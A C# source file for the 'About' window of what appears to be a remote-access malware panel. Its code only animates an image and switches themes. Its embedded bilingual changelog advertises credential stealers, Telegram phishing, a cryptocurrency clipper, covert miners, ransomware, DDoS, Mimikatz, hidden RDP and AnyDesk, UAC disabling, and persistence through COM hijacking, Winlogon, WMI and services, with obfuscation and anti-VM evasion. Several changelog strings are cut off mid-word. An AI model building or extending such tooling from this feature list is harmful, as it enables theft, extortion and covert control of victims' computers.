using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using MaterialSkin;
using Server.Helper;

namespace Server.Forms;

public class FormAbout : FormMaterial
{
	private Timer gifTimer;

	private int currentFrame;

	private int frameCount;

	private double frameAccumulator;

	private double frameDelay;

	private string currentLanguage = "en";

	private const string changelogRU = "[+] Список изменений v3.1 [12.05.2026]\n- Добавлена \u200b\u200bвкладка «Всего пользователей», отображающая всех пользователей в сети и вне сети.\n- Добавлена \u200b\u200bвкладка «Пользователи вне сети», отображающая всех пользователей вне сети.\n- Добавлена функция \"Auto FRPC\" функция позволяет запускать frpc сразу же вместе с панелью находится в во вкладке \"Settings\".\n- Добавлена \u200b\u200bфункция поиска: при нажатии комбинации Ctrl + F откроется меню поиска, где можно найти пользователя по его параметрам.\n- добавлена функция обновления страницы юзеров F3 + A\n- добавлена функция \"Telegram\" фишинг суть функции в том что ворует она телеграм пароли и код пароли.\n- Добавлена функция \"CSharp Compiler\" суть фукнции в том что это мини vs-code через который можно написать целый проект и запустить его удалённо пользователю.\n- Переработка полностью стилей.\n- Добавлена функция \"Ai-Control\" суть функции в том что позволяет юзером управлять с помощью AI агента.\n- Добавлена функция \"Disk Management\" суть функции просто небольшое управление дисками.\n- Обновлён Sniffer теперь плагин сниффит https http tcp udp.\n- Обновлена \u200b\u200bсистема лицензирования.\n- Обновлены формы \"Miner XMR\" и \"Miner Rigel\".\n- Обновлены формы «О программе»: теперь можно выбрать русский/английский язык.\n- Обновлена \u200b\u200bтекстовая форма, теперь можно выбирать анимации, а также устанавливать скорость анимации.\n- Обновлён Intelix Stealer суть обновления в том что теперь дешифрование куков улучшенно. + Собирает все локальные и интегрированные нейронные сети.\n- Обновлен звук вентилятора, звуки теперь работают быстрее, плагин отправляется быстрее и работает стабильнее.\n- Обновлена функция \"HardWare\" теперь по мимо дискорд можно управлять gpu,cpu,ram.\n- Обновлены задачи, добавлено множество автономных задач.\n- Уведомления Telegram теперь отправляются в журналы похитителей.\n- Обновлён Протект защита от рце атак\n- Исправлены баги с Dark Theme\n- Исправлен баг с выбором кастомного фона\n- Исправлен баг с стилями\n- Исправлен баг с Stub\n- Исправлен баг с Settings\n- Исправлен баг с выбором мониторов в плагине \"Desktop\".\n\n[+] Список изменений v3.0 [09.05.2026]\n- Добавлена \u200b\u200bновая вкладка «Сборки» в «FormBuilder» — суть этой функции в том, что она отображает историю ваших сборок.\n- Добавлена \u200b\u200bновая функция оболочки Winlogon, которая интегрирует вашу сборку в Winlogon.\n- Добавлена \u200b\u200bновая функция перехвата COM. Суть этой функции — перехват COM — метод, используемый злоумышленниками для выполнения вредоносного кода, обхода защиты и получения доступа к системе Windows.\n- Добавлена \u200b\u200bновая функция службы Windows. Суть этой функции в том, что она устанавливает вашу сборку в службы Windows.\n- Добавлена \u200b\u200bновая функция запуска WMI. Суть этой функции в том, что она устанавливает вашу сборку в автозагрузку WMI.\n- Добавлены функции «Сборка + Присоединение + VMP», «Сборка + Дроппер + Присоединение + VMP», «Сборка + Дроппер + VMP», «Сборка + Дроппер + Pump + VMP» — теперь вы можете создавать сборки с обфускацией VMP.\n- Добавлена \u200b\u200bновая функция «Имя процесса» в «FormBuilder» на вкладке «Общие». Суть этой функции в том, что она изменяет имя процесса вашего клиента в диспетчере задач.\n- Переработана функция «Установить архив» в «FormBuilder» — улучшена.\n- Исправлены функции «Build + Join», «Build + Dropper + Join», «Build + Dropper», «Build + Dropper + Pump» — теперь они работают нормально, как и должны.\n\n[+] Список изменений v2.9 [03.05.2026]\n- Добавлена \u200b\u200bфункция «Включить функцию» — суть этого плагина в том, что он включает и отключает компоненты Windows.\n- Добавлен «Установщик вредоносных программ» — новая вкладка на вкладке «Действия». Смысл этой вкладки в том, что теперь там будут храниться все установщики.\n- Добавлен «Планировщик» — добавлена \u200b\u200bвозможность отключать и включать планировщик в действии.\n- Добавлена \u200b\u200b«Системная лицензия» — добавлена \u200b\u200bавторизация + бот.\n- Обновлена \u200b\u200bиконка \"Icon\" - обновлены иконки.\n- Обновлена \u200b\u200bфункция \"Intelix Stealer\" - обновлены функции расшифровки.\n- Обновлена \u200b\u200bфункция \"Salsa Stealer\" - обновлены функции расшифровки.\n- Обновлена \u200b\u200bфункция \"Antarctida Stealer\" - обновлены функции расшифровки.\n- Обновлены задачи - теперь можно устанавливать больше задач, чем раньше.\n- Обновлено уведомление \"Notificator\" - изменен дизайн, теперь отображается сообщение при отключении пользователя.\n- Переработана функция \"Screamer\" - добавлена \u200b\u200bновая форма, а также новые типы крикунов.\n- Переработана функция \"Sniffer\" - сниффер перенесен и теперь перехватывает HTTPS-запросы и запросы.\n- Переработана функция \"Custom Background\" - теперь можно устанавливать прозрачность вместо размытия.\n- Переработана функция \"FormAbout\" - теперь GIF-файл заменен обычной фотографией, а размер server.exe уменьшен.\n- Переработан \"Автоматический похититель\" - Теперь автоматический похититель проверяет, есть ли у пользователя лог, а затем отправляет похититель Intelix + Salsa. Если один не собирает лог, он собирает другой.\n- Исправлен \"NetExecutor\" - Теперь работает корректно и без ошибок.\n- Исправлен \"Config/Client\" - теперь работает лучше.\n- Исправлен \"Style\" - теперь вместо черного текста отображаются белые, как и должно быть.\n\n[+] ChangeLog v2.8 [19.04.2026]\n- Переработан \"Form1\" - Переработана статистика о пользователях и т. д., вернее, удален весь ненужный мусор.\n- Переработаны \"Уведомления\" - теперь имеют другой, красивый, современный стиль.\n- Исправлены ошибки \"Form1\" - Исправлена \u200b\u200bошибка, которая мешала растягивать форму и изменять ее размер. Теперь это возможно.\n- Исправлены ошибки \"Form Camera\" - Теперь можно изменять качество камеры. — Добавлена \u200b\u200bфункция «Автоматическая заметка» — теперь автоматическая заметка автоматически устанавливает страны для каждого пользователя.\n— Добавлена \u200b\u200bфункция «Копировать в логи» — на вкладке «Логи» добавлена \u200b\u200bкнопка для копирования логов.\n— Добавлена \u200b\u200bфункция «Фон» — позволяет установить пользовательский фон.\n— Добавлена \u200b\u200bфункция «Miner Rigel» — эта функция была доступна, но не подключена, теперь она подключена и работает.\n— Добавлено «Всего пользователей» — счетчик всех ваших пользователей, как в сети, так и вне сети.\n— Обновлена \u200b\u200bпанель «Clipper» — обновлено: теперь вы можете копировать Steam Trade, а также Solana BNB и TON.\n— Обновлена \u200b\u200bпанель «Miner XMR» — создана панель хешрейта.\n— Обновлена \u200b\u200bпанель «Miner ETC» — переработана в Miner BZ.\n— Обновлена \u200b\u200bпанель «Все обработчики» — для каждого обработчика добавлена \u200b\u200bпроверка.\n\n[+] Список изменений v2.7 [15.04.2026]\n- Удален раздел «Столбцы» на вкладке «Основная» формы 1.\n- Исправлена \u200b\u200b«Темная тема» — исправлена \u200b\u200bтемная тема в некоторых формах.\n- Переработана функция ввода текста формы в настройках.\n- Исправлен плагин «DDos» — должен работать корректно.\n- Переработана «Радужная тема» — теперь мерцает только панель с пользователями.\n- Исправлен «Стиль» — исправлены ошибки со стилями, такие как дубликаты и несоответствие цветов темам, но все исправлено.\n\n[+] Список изменений v2.6 [08.04.2026]\n- Добавлена \u200b\u200bфункция «Распаковка с USB» в «FormBuilder» — распакуйте клиент на подключенный USB-накопитель.\n- Добавлена \u200b\u200bфункция «Критически важный процесс» — устанавливается на клиент, чтобы закрывать те процессы, которые будут мешать его работе.\n- Добавлена \u200b\u200bфункция \"Запуск WMI\" в \"FormBuilder\" - не работает\n- Добавлена \u200b\u200bфункция \"Имя процесса\" в \"FormBuilder\" - изменяет имя вашего процесса \"Клиент\". (не работает)\n- Добавлена \u200b\u200bфункция \"Загрузочный комплект\" в \"FormBuilder\" - эта функция позволяет надежно интегрировать его в систему. (не работает)\n- Добавлена \u200b\u200bфункция \"Антивиртуальная блокировка\" в \"FormBuilder\" - суть функции заключается в возможности включения или отключения блокировки виртуальных машин.\n- Добавлена \u200b\u200bфункция \"Генерация\" в \"FormBuilder\" - суть";

	private const string changelogEN = "[+] ChangeLog v3.1 [12.05.2026]\n- Added Total Users tab shows all users offline and online.\n- Added Offline Users tab shows all offline users.\n- Added \"Auto FRPC\" function. This function allows you to run frpc simultaneously with the panel located in the \"Settings\" tab.\n- Added Search function: if you press the combination Ctrl + F, a search menu will open, where you can search for a user by their parameters.\n- Added the F3+A user page refresh function\n- Added \"Telegram\" Phishing on the tab.\n- Added the \"CSharp Compiler\" function. The essence of the function is that it is a mini vs-code, with which you can write an entire project and run it remotely by the user.\n- Rework all styles.\n- Added AI-Control The essence of the plugin is that it allows you to manage the user through an AI agentю\n- Added the \"Disk Management\" function, the essence of the function is simply a little disk management.\n- Fixed Dark theme to forms.\n- Fixed all style.\n- Fixed bug for stub.\n- Fixed bug for settings.\n- Fixed a bug with selecting monitors in the \"Desktop\" plugin.\n- Updated the \"HardWare\" function: now you can manage your GPU, CPU, RAM in Discord.\n- Updated The Sniffer plugin has been updated and now sniffs http, https, tcp, and udp requests.\n- Updated License System.\n- Updated \"Miner XMR\" and \"Miner Rigel\" forms.\n- Updated Intelix Stealer Encypt Browser + Collects all local and IDE neural networks.\n- Updated Selecting a custom background.\n- Updated About Forms update: now you can select Russian/English language.\n- Updated The Text form has been updated, now you can select animations and also set the animation speed.\n- Updated Fan Audio has been updated, sounds now work faster and the plugin is sent faster and works more stably.\n- Updated The tasks have been updated and many autonomous tasks have been added.\n- Updated Telegram notifications are now sent to the stealer logs.\n- Updated RCE Protect.\n\n[+] ChangeLog v3.0 [09.05.2026]\n- Added a new \"Builds\" tab to \"FormBuilder\" - the essence of this function is that it the history of your builds.\n- Added new Winlogon Shell feature that integrates your build into Winlogon.\n- Added a new COM Hijacking feature. The essence of this feature is COM Hijacking - a technique used by attackers to execute malicious code, bypass protection and gain a foothold in the Windows system.\n- Added a new Windows Service function. The essence of this function is that it installs your build into Windows services.\n- Added a new function WMI Startup. The essence of the function is that it installs your build in WMI startup.\n- Added \"Build + Join + VMP\", \"Build + Dropper + Join + VMP\", \"Build + Dropper + VMP\", \"Build + Dropper + Pump + VMP\" - Now you can create under VMP obfuscation.\n- Added a new function Process Name in the \"FormBuilder\" in the Common tab. The essence of this function is that it changes the name of your client's process in the task manager.\n- Rework \"Install Archive\" to \"FormBuilder\" - improved.\n- Fixed \"Build + Join\", \"Build + Dropper + Join\", \"Build + Dropper\", \"Build + Dropper + Pump\" - Function fix Now they work normally as they should.\n\n[+] ChangeLog v2.9 [03.05.2026]\n- Added \"Enable Feature\" - The essence of this plugin is that it enables and disables Windows components.\n- Added \"Malware Installer\" - New tab in the \"Action\" tab. The point of this tab is that all installers will now be stored there.\n- Added \"Scheduler\" - Added the ability to disable and enable the scheduler in action.\n- Added \"System License\" - Authorization was made + bot.\n- Updated \"Icon\" - updated icons.\n- Updated \"Intelix Stealer\" - decryptions updated\n- Updated \"Salsa Stealer\" - decryptions updated\n- Updated \"Antarctida Stealer\" - decryptions updated\n- Updated \"Tasks\" - Now you can install more in tasks than before.\n- Updated \"Notificator\" - The design has been changed and a message is now displayed when a user is disconnected.\n- Rework \"Screamer\" - New form and also new types of screamers have been added.\n- Rework \"Sniffer\" - The sniffer has been transferred and now it sniffs https and requests.\n- Rework \"Custom Background\" - It has been redesigned so you can now set transparency instead of blur.\n- Rework \"FormAbout\" - Now the gif is replaced by a regular photo, and the server.exe size has been reduced.\n- Rework \"Auto Stealer\" - Now the auto stealer checks whether the user has a log or not and then sends the Intelix + Salsa stealer. If one doesn't collect it, it collects the other one.\n- Fixed \"NetExecutor\" - Now it works properly and without bugs.\n- Fixed \"Config/Client\" - works better now.\n- Fixed \"Style\" - now instead of black texts, white ones were made as they should be.\n\n[+] ChangeLog v2.8 [19.04.2026]\n- Rework \"Form1\" - Its statistics about users, etc., were reworked, or rather, all the garbage was removed.\n- Rework \"notifications\" - now have a different, beautiful, modern style.\n- Fixed bugs \"Form1\" - The bug that prevented you from stretching the form and changing its size has been fixed. Now you can.\n- Fixed bugs \"Form Camera\" - Now you can change the camera quality.\n- Added \"Auto Note\" - Now auto note automatically sets countries by user.\n- Added \"Copy to Logs\" - A button was added to the Logs tab to copy logs.\n- Added \"Background\" - a feature that allows you to set a custom background.\n- Added \"Miner Rigel\" - This function was available but not connected, but now it is connected and works.\n- Added \"Total Users\" - A counter for all your users, both offline and online.\n- Updated \"Clipper Panel\" - Updated: now you can clip Steam Trade and also Solana BNB and TON.\n- Updated \"Miner XMR\" - a hashreait panel was created.\n- Updated \"Miner ETC\" - remixed into Miner BZ.\n- Updated \"all handlers\" - validation was installed on each handler.\n\n[+] ChangeLog v2.7 [15.04.2026]\n- Removed \"Columns\" to \"Form1\" tab \"main\".\n- Fixed \"Dark theme\" - The dark theme was fixed in some forms.\n- The form text function in settings has been reworked.\n- Fixed \"DDos\" plugin - should work correctly\n- Rework \"Raindow Theme\" - Now only the panel with users is shimmering.\n- Fixed \"Style\" - Bugs with styles were fixed, in that there were duplicates and also colors did not match the themes, but everything was fixed.\n\n[+] ChangeLog v2.6 [08.04.2026]\n- Added \"USB Spread\" to \"FormBuilder\" - unpack your client onto a connected USB flash drive.\n- Added \"Process Critical\" - The function is installed on the Client so that it closes those processes that will interfere with its operation.\n- Added \"WMI Startup\" to \"FormBuilder\" - no work\n- Added \"Process Name\" to \"FormBuilder\" - changes the name of your \"Client\" process. (no work)\n- Added \"Boot Kit\" to \"FormBuilder\" - The function allows it to be sewn tightly into the system. (no work)\n- Added \"Anti Virtual\" to \"FormBuilder\" - The essence of the function is that it would be possible to enable or disable virtual machine locking.\n- Added \"Generate\" to \"FormBuilder\" - The essence of this button is in the 3rd tab; it is needed to generate the \"Assembly\" for your client.\n- Added \"Standart obfuscation\" - Functions have been added to enable or disable standard obfuscation from your Client.\n- Added \"Build VMP\" to \"FormBuilder\" - Obfuscate your build file with vmp obfuscation.\n- Added \"Build Reactor\" to \"FormBuilder\" - Obfuscate your build file under net reactor obfuscation.\n- Added \"Build Mpress\" to \"FormBuilder\" - Compresses your build file to the maximum state possible.\n- Added \"Build Donut\" to \"FormBuilder\" - build + conut.\n- Added \"Build SFX\" to \"FormBuilder\" - The point is that it creates an SFX build that will automatically unpack and run your file.\n\n[+] ChangeLog v2.5 [28.03.2026]\n- Added \"Import'IPs\" to \"FormBuilder\" - allows you to import your IP address\n- Added \"Import'IPp\" to \"FormBuilder\" - allows you to import your IP address:port\n- Added \"Reset\" to \"FormBuilder\" - resets everything to its normal state\n- Update \"Stealer\" new stealer \"Antarctida\"\n- Update Recovery Stealer plugin\n- Update \"BotKiller - The malware removal system has been improved.\" plugin\n- Update \"DiscordRPC - An animated discordrpc has been created.\" plugin\n- Added \"Ransomware - This plugin allows you to block a user's computer\" plugin\n- Added \"Windows Recovery - Allows you to enable and disable Windows Recovery\" plugin\n- Added \"Mimi Katz\" plugin\n- Added \"Net Executor - Allows you to inject scripts remotely into a user.\" plugin\n- Added \"Nmap\" plugin\n- Added \"Sniffer - Sniffer allows you to sniff networks\" plugin\n- Added \"Browser - Allows you to run browsers stealthily\" plugin\n- Added \"Hardware - A plugin that allows you to manage user disks.\" plugin\n- Added \"Firewall - Allows you to view the user's Firewall\" plugin\n- Added \"Scanner - The scanner scans the user's networks\" plugin\n- Added \"Arp Scanner - Arp Scanner is a plugin that allows you to view open ports on a user's IP address.\" plugin\n- Added \"Task Scheduler - Allows you to view the user's task scheduler\" plugin\n- Added \"Windows Restores - Allows the user to initiate a system reset\" plugin\n- Added \"Windows Customizer - Allows the user to customize the system\" plugin\n- Added \"Config\" to Client\n- New tab \"Columns\" \n\n[+] ChangeLog v2.4 [24.02.2026]\n- Fixed Stub - Fixed client spam in the scheduler\n- Added Recovery Stealer\n- Added \"Camera Demonstration - The plugin allows you to open a preview of your camera to the user.\" plugin\n- Added \"Reverse Tunnel - Allows port forwarding\" plugin\n- Added \"Reverse Forward - Allows port forwarding\" plugin\n- Update \"WinLocker - The colors have been updated and the blocker has also been improved.\"\n- Remove Playit Grabber - Allows you to steal plaiyt settings\n- Action plugin \"Fixed\" - Fixed all functions\n\n[+] ChangeLog v2.3 [20.02.2026]\n- Update \"Obfuscator Stub\"\n- Added \"Hidden RDP - Establishes RDP for the user\"\n- Added \"Offline users\"\n- Added \"Disable UAC - Allows the user to disable UAC\"\n- Added \"Mem Reduct - Loads the user's RAM\"\n- Added \"Hidden AnyDesk - Installs AnyDesk stealthily\"\n- Added tab \"Phishing\", \"Steam Guard\"\n- Added \"Hidden Installers - Installers of hidden packages on the user's PC\" \n- Added Screamer plugin - displays a scary image to the user\n- Added Fun Audio - Plays funny sounds to the user remotely\n- Added Desktop Demonstration - Allows you to share your screen with the user.\n- Fixed \"Stub\" Fixed spam Client process for task manager";

	private IContainer components;

	private Label label2;

	private GroupBox groupBoxChangeLog;

	private RichTextBox richTextBoxChangeLog;

	private PictureBox pictureBoxGif;

	private Button buttonRussian;

	private Button buttonEnglish;

	public FormAbout()
	{
		InitializeComponent();
	}

	private void FormAbout_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		LoadChangelog("en");
		if (pictureBoxGif.Image == null)
		{
			return;
		}
		try
		{
			FrameDimension dimension = new FrameDimension(pictureBoxGif.Image.FrameDimensionsList[0]);
			frameCount = pictureBoxGif.Image.GetFrameCount(dimension);
			if (frameCount > 1)
			{
				try
				{
					int delay = BitConverter.ToInt32(pictureBoxGif.Image.GetPropertyItem(20736).Value, 0);
					frameDelay = ((delay > 0) ? delay : 5);
				}
				catch
				{
					frameDelay = 5.0;
				}
				gifTimer = new Timer();
				gifTimer.Interval = 16;
				gifTimer.Tick += GifTimer_Tick;
				gifTimer.Start();
			}
		}
		catch
		{
		}
	}

	private void GifTimer_Tick(object sender, EventArgs e)
	{
		if (pictureBoxGif?.Image == null || frameCount <= 1)
		{
			return;
		}
		try
		{
			frameAccumulator += 1.6;
			if (frameAccumulator >= frameDelay)
			{
				frameAccumulator -= frameDelay;
				currentFrame = (currentFrame + 1) % frameCount;
				FrameDimension dimension = new FrameDimension(pictureBoxGif.Image.FrameDimensionsList[0]);
				pictureBoxGif.Image.SelectActiveFrame(dimension, currentFrame);
				pictureBoxGif.Invalidate();
			}
		}
		catch
		{
		}
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		if (gifTimer != null)
		{
			gifTimer.Stop();
			gifTimer.Dispose();
		}
		base.OnFormClosing(e);
	}

	private void ChangeScheme(object sender)
	{
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (isDark ? Color.FromArgb(40, 40, 40) : Color.White);
		Color text = (isDark ? Color.WhiteSmoke : Color.Black);
		BackColor = back;
		label2.ForeColor = text;
		groupBoxChangeLog.ForeColor = text;
		groupBoxChangeLog.BackColor = back;
		richTextBoxChangeLog.BackColor = (isDark ? Color.FromArgb(30, 30, 30) : Color.White);
		richTextBoxChangeLog.ForeColor = text;
		pictureBoxGif.BackColor = back;
		buttonRussian.BackColor = back;
		buttonEnglish.BackColor = back;
		buttonRussian.FlatStyle = FlatStyle.Flat;
		buttonEnglish.FlatStyle = FlatStyle.Flat;
		buttonRussian.FlatAppearance.BorderColor = (isDark ? Color.FromArgb(70, 70, 70) : Color.FromArgb(200, 200, 200));
		buttonEnglish.FlatAppearance.BorderColor = (isDark ? Color.FromArgb(70, 70, 70) : Color.FromArgb(200, 200, 200));
		UpdateButtonStyles();
	}

	private void LoadChangelog(string language)
	{
		currentLanguage = language;
		if (language == "ru")
		{
			richTextBoxChangeLog.Text = "[+] Список изменений v3.1 [12.05.2026]\n- Добавлена \u200b\u200bвкладка «Всего пользователей», отображающая всех пользователей в сети и вне сети.\n- Добавлена \u200b\u200bвкладка «Пользователи вне сети», отображающая всех пользователей вне сети.\n- Добавлена функция \"Auto FRPC\" функция позволяет запускать frpc сразу же вместе с панелью находится в во вкладке \"Settings\".\n- Добавлена \u200b\u200bфункция поиска: при нажатии комбинации Ctrl + F откроется меню поиска, где можно найти пользователя по его параметрам.\n- добавлена функция обновления страницы юзеров F3 + A\n- добавлена функция \"Telegram\" фишинг суть функции в том что ворует она телеграм пароли и код пароли.\n- Добавлена функция \"CSharp Compiler\" суть фукнции в том что это мини vs-code через который можно написать целый проект и запустить его удалённо пользователю.\n- Переработка полностью стилей.\n- Добавлена функция \"Ai-Control\" суть функции в том что позволяет юзером управлять с помощью AI агента.\n- Добавлена функция \"Disk Management\" суть функции просто небольшое управление дисками.\n- Обновлён Sniffer теперь плагин сниффит https http tcp udp.\n- Обновлена \u200b\u200bсистема лицензирования.\n- Обновлены формы \"Miner XMR\" и \"Miner Rigel\".\n- Обновлены формы «О программе»: теперь можно выбрать русский/английский язык.\n- Обновлена \u200b\u200bтекстовая форма, теперь можно выбирать анимации, а также устанавливать скорость анимации.\n- Обновлён Intelix Stealer суть обновления в том что теперь дешифрование куков улучшенно. + Собирает все локальные и интегрированные нейронные сети.\n- Обновлен звук вентилятора, звуки теперь работают быстрее, плагин отправляется быстрее и работает стабильнее.\n- Обновлена функция \"HardWare\" теперь по мимо дискорд можно управлять gpu,cpu,ram.\n- Обновлены задачи, добавлено множество автономных задач.\n- Уведомления Telegram теперь отправляются в журналы похитителей.\n- Обновлён Протект защита от рце атак\n- Исправлены баги с Dark Theme\n- Исправлен баг с выбором кастомного фона\n- Исправлен баг с стилями\n- Исправлен баг с Stub\n- Исправлен баг с Settings\n- Исправлен баг с выбором мониторов в плагине \"Desktop\".\n\n[+] Список изменений v3.0 [09.05.2026]\n- Добавлена \u200b\u200bновая вкладка «Сборки» в «FormBuilder» — суть этой функции в том, что она отображает историю ваших сборок.\n- Добавлена \u200b\u200bновая функция оболочки Winlogon, которая интегрирует вашу сборку в Winlogon.\n- Добавлена \u200b\u200bновая функция перехвата COM. Суть этой функции — перехват COM — метод, используемый злоумышленниками для выполнения вредоносного кода, обхода защиты и получения доступа к системе Windows.\n- Добавлена \u200b\u200bновая функция службы Windows. Суть этой функции в том, что она устанавливает вашу сборку в службы Windows.\n- Добавлена \u200b\u200bновая функция запуска WMI. Суть этой функции в том, что она устанавливает вашу сборку в автозагрузку WMI.\n- Добавлены функции «Сборка + Присоединение + VMP», «Сборка + Дроппер + Присоединение + VMP», «Сборка + Дроппер + VMP», «Сборка + Дроппер + Pump + VMP» — теперь вы можете создавать сборки с обфускацией VMP.\n- Добавлена \u200b\u200bновая функция «Имя процесса» в «FormBuilder» на вкладке «Общие». Суть этой функции в том, что она изменяет имя процесса вашего клиента в диспетчере задач.\n- Переработана функция «Установить архив» в «FormBuilder» — улучшена.\n- Исправлены функции «Build + Join», «Build + Dropper + Join», «Build + Dropper», «Build + Dropper + Pump» — теперь они работают нормально, как и должны.\n\n[+] Список изменений v2.9 [03.05.2026]\n- Добавлена \u200b\u200bфункция «Включить функцию» — суть этого плагина в том, что он включает и отключает компоненты Windows.\n- Добавлен «Установщик вредоносных программ» — новая вкладка на вкладке «Действия». Смысл этой вкладки в том, что теперь там будут храниться все установщики.\n- Добавлен «Планировщик» — добавлена \u200b\u200bвозможность отключать и включать планировщик в действии.\n- Добавлена \u200b\u200b«Системная лицензия» — добавлена \u200b\u200bавторизация + бот.\n- Обновлена \u200b\u200bиконка \"Icon\" - обновлены иконки.\n- Обновлена \u200b\u200bфункция \"Intelix Stealer\" - обновлены функции расшифровки.\n- Обновлена \u200b\u200bфункция \"Salsa Stealer\" - обновлены функции расшифровки.\n- Обновлена \u200b\u200bфункция \"Antarctida Stealer\" - обновлены функции расшифровки.\n- Обновлены задачи - теперь можно устанавливать больше задач, чем раньше.\n- Обновлено уведомление \"Notificator\" - изменен дизайн, теперь отображается сообщение при отключении пользователя.\n- Переработана функция \"Screamer\" - добавлена \u200b\u200bновая форма, а также новые типы крикунов.\n- Переработана функция \"Sniffer\" - сниффер перенесен и теперь перехватывает HTTPS-запросы и запросы.\n- Переработана функция \"Custom Background\" - теперь можно устанавливать прозрачность вместо размытия.\n- Переработана функция \"FormAbout\" - теперь GIF-файл заменен обычной фотографией, а размер server.exe уменьшен.\n- Переработан \"Автоматический похититель\" - Теперь автоматический похититель проверяет, есть ли у пользователя лог, а затем отправляет похититель Intelix + Salsa. Если один не собирает лог, он собирает другой.\n- Исправлен \"NetExecutor\" - Теперь работает корректно и без ошибок.\n- Исправлен \"Config/Client\" - теперь работает лучше.\n- Исправлен \"Style\" - теперь вместо черного текста отображаются белые, как и должно быть.\n\n[+] ChangeLog v2.8 [19.04.2026]\n- Переработан \"Form1\" - Переработана статистика о пользователях и т. д., вернее, удален весь ненужный мусор.\n- Переработаны \"Уведомления\" - теперь имеют другой, красивый, современный стиль.\n- Исправлены ошибки \"Form1\" - Исправлена \u200b\u200bошибка, которая мешала растягивать форму и изменять ее размер. Теперь это возможно.\n- Исправлены ошибки \"Form Camera\" - Теперь можно изменять качество камеры. — Добавлена \u200b\u200bфункция «Автоматическая заметка» — теперь автоматическая заметка автоматически устанавливает страны для каждого пользователя.\n— Добавлена \u200b\u200bфункция «Копировать в логи» — на вкладке «Логи» добавлена \u200b\u200bкнопка для копирования логов.\n— Добавлена \u200b\u200bфункция «Фон» — позволяет установить пользовательский фон.\n— Добавлена \u200b\u200bфункция «Miner Rigel» — эта функция была доступна, но не подключена, теперь она подключена и работает.\n— Добавлено «Всего пользователей» — счетчик всех ваших пользователей, как в сети, так и вне сети.\n— Обновлена \u200b\u200bпанель «Clipper» — обновлено: теперь вы можете копировать Steam Trade, а также Solana BNB и TON.\n— Обновлена \u200b\u200bпанель «Miner XMR» — создана панель хешрейта.\n— Обновлена \u200b\u200bпанель «Miner ETC» — переработана в Miner BZ.\n— Обновлена \u200b\u200bпанель «Все обработчики» — для каждого обработчика добавлена \u200b\u200bпроверка.\n\n[+] Список изменений v2.7 [15.04.2026]\n- Удален раздел «Столбцы» на вкладке «Основная» формы 1.\n- Исправлена \u200b\u200b«Темная тема» — исправлена \u200b\u200bтемная тема в некоторых формах.\n- Переработана функция ввода текста формы в настройках.\n- Исправлен плагин «DDos» — должен работать корректно.\n- Переработана «Радужная тема» — теперь мерцает только панель с пользователями.\n- Исправлен «Стиль» — исправлены ошибки со стилями, такие как дубликаты и несоответствие цветов темам, но все исправлено.\n\n[+] Список изменений v2.6 [08.04.2026]\n- Добавлена \u200b\u200bфункция «Распаковка с USB» в «FormBuilder» — распакуйте клиент на подключенный USB-накопитель.\n- Добавлена \u200b\u200bфункция «Критически важный процесс» — устанавливается на клиент, чтобы закрывать те процессы, которые будут мешать его работе.\n- Добавлена \u200b\u200bфункция \"Запуск WMI\" в \"FormBuilder\" - не работает\n- Добавлена \u200b\u200bфункция \"Имя процесса\" в \"FormBuilder\" - изменяет имя вашего процесса \"Клиент\". (не работает)\n- Добавлена \u200b\u200bфункция \"Загрузочный комплект\" в \"FormBuilder\" - эта функция позволяет надежно интегрировать его в систему. (не работает)\n- Добавлена \u200b\u200bфункция \"Антивиртуальная блокировка\" в \"FormBuilder\" - суть функции заключается в возможности включения или отключения блокировки виртуальных машин.\n- Добавлена \u200b\u200bфункция \"Генерация\" в \"FormBuilder\" - суть";
			groupBoxChangeLog.Text = "ChangeLog (Русский)";
		}
		else
		{
			richTextBoxChangeLog.Text = "[+] ChangeLog v3.1 [12.05.2026]\n- Added Total Users tab shows all users offline and online.\n- Added Offline Users tab shows all offline users.\n- Added \"Auto FRPC\" function. This function allows you to run frpc simultaneously with the panel located in the \"Settings\" tab.\n- Added Search function: if you press the combination Ctrl + F, a search menu will open, where you can search for a user by their parameters.\n- Added the F3+A user page refresh function\n- Added \"Telegram\" Phishing on the tab.\n- Added the \"CSharp Compiler\" function. The essence of the function is that it is a mini vs-code, with which you can write an entire project and run it remotely by the user.\n- Rework all styles.\n- Added AI-Control The essence of the plugin is that it allows you to manage the user through an AI agentю\n- Added the \"Disk Management\" function, the essence of the function is simply a little disk management.\n- Fixed Dark theme to forms.\n- Fixed all style.\n- Fixed bug for stub.\n- Fixed bug for settings.\n- Fixed a bug with selecting monitors in the \"Desktop\" plugin.\n- Updated the \"HardWare\" function: now you can manage your GPU, CPU, RAM in Discord.\n- Updated The Sniffer plugin has been updated and now sniffs http, https, tcp, and udp requests.\n- Updated License System.\n- Updated \"Miner XMR\" and \"Miner Rigel\" forms.\n- Updated Intelix Stealer Encypt Browser + Collects all local and IDE neural networks.\n- Updated Selecting a custom background.\n- Updated About Forms update: now you can select Russian/English language.\n- Updated The Text form has been updated, now you can select animations and also set the animation speed.\n- Updated Fan Audio has been updated, sounds now work faster and the plugin is sent faster and works more stably.\n- Updated The tasks have been updated and many autonomous tasks have been added.\n- Updated Telegram notifications are now sent to the stealer logs.\n- Updated RCE Protect.\n\n[+] ChangeLog v3.0 [09.05.2026]\n- Added a new \"Builds\" tab to \"FormBuilder\" - the essence of this function is that it the history of your builds.\n- Added new Winlogon Shell feature that integrates your build into Winlogon.\n- Added a new COM Hijacking feature. The essence of this feature is COM Hijacking - a technique used by attackers to execute malicious code, bypass protection and gain a foothold in the Windows system.\n- Added a new Windows Service function. The essence of this function is that it installs your build into Windows services.\n- Added a new function WMI Startup. The essence of the function is that it installs your build in WMI startup.\n- Added \"Build + Join + VMP\", \"Build + Dropper + Join + VMP\", \"Build + Dropper + VMP\", \"Build + Dropper + Pump + VMP\" - Now you can create under VMP obfuscation.\n- Added a new function Process Name in the \"FormBuilder\" in the Common tab. The essence of this function is that it changes the name of your client's process in the task manager.\n- Rework \"Install Archive\" to \"FormBuilder\" - improved.\n- Fixed \"Build + Join\", \"Build + Dropper + Join\", \"Build + Dropper\", \"Build + Dropper + Pump\" - Function fix Now they work normally as they should.\n\n[+] ChangeLog v2.9 [03.05.2026]\n- Added \"Enable Feature\" - The essence of this plugin is that it enables and disables Windows components.\n- Added \"Malware Installer\" - New tab in the \"Action\" 